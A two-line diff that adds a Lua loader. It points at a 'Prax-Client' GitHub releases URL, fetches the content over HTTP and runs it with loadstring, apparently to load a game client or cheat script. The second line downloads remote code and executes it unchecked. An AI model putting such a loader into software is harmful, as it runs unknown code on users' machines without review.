@@ -1,0 +1,2 @@
+local src="https://github.com/Prax-Client/Releases"
+loadstring(Http:Get(src,true))()
